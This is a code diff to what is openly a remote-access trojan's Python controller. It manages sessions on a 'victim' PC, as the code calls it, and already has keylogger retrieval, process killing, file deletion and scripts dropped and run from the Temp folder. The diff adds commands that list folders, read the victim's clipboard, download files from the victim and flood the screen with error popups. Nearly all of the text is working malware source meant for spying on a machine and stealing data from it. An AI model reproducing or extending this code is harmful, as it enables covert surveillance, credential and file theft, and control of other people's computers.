@@ -23,7 +23,8 @@ session_ids = []
 # saves all the command
 COMMANDS = ["help", "sessions"]
 SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs",
-                    "keybind", "msg", "statlights", "delete", "uninstall"]
+                    "keybind", "msg", "statlights", "delete", "uninstall", "ls", "whoami", "clipboard", "download",
+                    "error"]
 
 
 class Commands:
@@ -113,8 +114,8 @@ class Commands:
 
             if msg_length:
                 msg_length = int(msg_length)
-                msg = conn.recv(msg_length).decode(FORMAT)
-                return msg
+                decodetMsg = conn.recv(msg_length).decode(FORMAT)
+                return decodetMsg
 
         # sends the message
         def sendMessage(msg, recv=False):
@@ -139,7 +140,6 @@ class Commands:
         # prints the help message
         elif message == "help":
             print(self.helpmsg)
-            return
 
         # shows the entire dir tree
         elif message == "tree":
@@ -157,9 +157,8 @@ class Commands:
                     arg = int(args[0])
                 except ValueError:
                     print("The argument needs to be a number")
-                    return
                 # gets the username of the computer
-                username = sendMessage("c o echo %USERNAME%")
+                username = sendMessage("c o echo %USERNAME%").replace("\n", "")
                 # sends the matrix.bat script
                 with open("extraScripts/matrix.bat", "r") as file:
                     sendMessage(file.read())
@@ -169,13 +168,10 @@ class Commands:
                     sendMessage(f"c n start cmd /c C:\\Users\\{username}\\AppData\\Local\\Temp\\{name}")
                     sleep(0.1)
 
-                return
             elif not args:
                 print("you need an argument type 'help' for more")
-                return
             else:
                 print("Those are too many arguments only one is allowed type 'help' for more.")
-                return
         # shows all tasks with pid
         elif message == "ps":
             print(sendMessage("c o tasklist"))
@@ -187,7 +183,6 @@ class Commands:
                     args = int(args[0])
                 except ValueError:
                     print("you need to enter a pid(number)")
-                    return
                 sendMessage(f"c x taskkill /im {args}")
             elif not args:
                 print("You need arguments type 'help' for more.")
@@ -199,16 +194,15 @@ class Commands:
                 sendMessage(file.read())
             if receiveMessage() == "err":
                 print("You need to install the shell")
-                return
         # gets the keylogger logs
         elif message == "getlogs":
-            exists = sendMessage("r o C:/$SysStartup/temp/logs.txt")
+            sendMessage("r C:/$SysStartup/temp/logs.txt")
+            exists = receiveMessage()
             if exists != "err":
                 with open("downloadedLogs.txt", "a") as file:
                     file.write(str(exists))
             else:
                 print("Either wait for a logfile or install the keylogger.")
-                return
         # deletes a file in given path
         elif message == "delete":
             if args:
@@ -216,10 +210,8 @@ class Commands:
                 sendMessage(f"c n del /f /Q {message}")
             elif not args:
                 print("You need a path type 'help' for more")
-                return
             else:
                 print("to many arguments type 'help' for more")
-                return
 
         # uninstalls the whole shell
         elif message == "uninstall":
@@ -230,6 +222,8 @@ class Commands:
             name = receiveMessage()
             sendMessage(f"c n C:\\Users\\{user}\\AppData\\Local\\Temp\\{name}")
             sendMessage("!dsc")
+            conn.close()
+            delete()
 
         # sends a keybind
         elif message == "keybind":
@@ -259,7 +253,6 @@ class Commands:
                 print("You need to type the keybinds type 'help' for more.")
             else:
                 print("Those are to many arguments type 'help' for more.")
-                return
         # types a message into notepad
         elif message == "msg":
             if args:
@@ -277,11 +270,64 @@ class Commands:
                 for i in range(0, int(args[0])):
                     key = randint(0, 2)
                     sendMessage(f"k s {keys[key]}")
-                    sleep(0.1)
-            if not args:
+                    sleep(0.2)
+            elif not args:
                 print("You need to write how many times to let the lights blink type 'help' for more")
             else:
                 print("Too many arguments type 'help' for more")
+
+        # shows the contents of a folder
+        elif message == "ls":
+            if args:
+                path = " ".join(args).replace("/", "\\")
+                print(sendMessage(f'c o dir "{path}"'))
+
+            elif not args:
+                print("You need specify a path type 'help' for more")
+        # basic whoami command
+        elif message == "whoami":
+            print(sendMessage("c o whoami"))
+
+        # shows whats currently in the clipboard
+        elif message == "clipboard":
+            print(sendMessage("c o powershell Get-Clipboard"))
+        # downloads a file from given path
+        elif message == "download":
+            if args:
+                path = " ".join(args).replace("\\", "/")
+                ending = path[path.index("."):]
+                drive = path[0].upper()
+                path = path[1:]
+                path = drive+path
+                sendMessage(f'r {path}')
+                downloaded = receiveMessage()
+                with open(f"download{ending}", "w") as download:
+                    download.write(downloaded)
+            elif not args:
+                print("You need to specify a path")
+            else:
+                print("Too many argument type 'help' for more")
+        # open many error messages
+        elif message == "error":
+            if args:
+                # checks if argument is a number
+                try:
+                    t = int(args[0])
+                except ValueError:
+                    print("you need to input a number type 'help' for more")
+                username = sendMessage("c o echo %USERNAME%").replace("\n", "")
+                with open("extraScripts/errorbox.vbs", "r") as file:
+                    sendMessage(file.read())
+                name = receiveMessage()
+
+                for i in range(int(args[0])):
+                    print(name, username)
+                    sendMessage(f'c n C:\\Users\\{username}\\AppData\\Local\\Temp\\{name}')
+
+            elif not args:
+                print("you need to specify the quantity of windows type 'help' for more")
+            else:
+                print("too many arguments type 'help' for more")
 
         # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
